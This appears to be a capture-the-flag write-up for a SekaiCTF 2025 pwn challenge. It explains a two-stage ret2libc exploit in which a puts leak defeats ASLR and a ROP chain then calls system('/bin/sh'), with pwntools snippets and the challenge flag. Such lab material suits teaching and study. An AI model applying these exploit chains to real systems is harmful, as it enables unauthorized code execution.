---
title: "StackSurfer — ret2libc Chain"
pubDate: "2025-07-14"
event: "SekaiCTF 2025"
author: "w4ve"
score: "500 pts"
tags: ["pwn"]
description: "Bypassing ASLR and NX using a two-stage ret2libc payload chain."
---

# StackSurfer (Pwn - 500 pts)

## Challenge Analysis
`stacksurfer` is a 64-bit ELF binary with Partial RELRO, No Canary, NX Enabled, PIE Disabled.

## Exploitation Steps

1. **Stage 1: Leak `puts` GOT address**:
   Construct a ROP chain calling `puts@plt(puts@got)` and returning back to `main`.
   ```python
   rop = ROP(elf)
   rop.raw(pop_rdi)
   rop.raw(elf.got['puts'])
   rop.raw(elf.plt['puts'])
   rop.raw(elf.symbols['main'])
   ```

2. **Stage 2: Calculate libc base & execute `system("/bin/sh")`**:
   ```python
   libc.address = leaked_puts - libc.symbols['puts']
   rop2 = ROP(libc)
   rop2.raw(ret) # align stack for movaps
   rop2.system(next(libc.search(b'/bin/sh')))
   ```

Flag: `SEKAI{r3t2l1bc_st4ck_4l1gnm3nt_m4st3r}`.
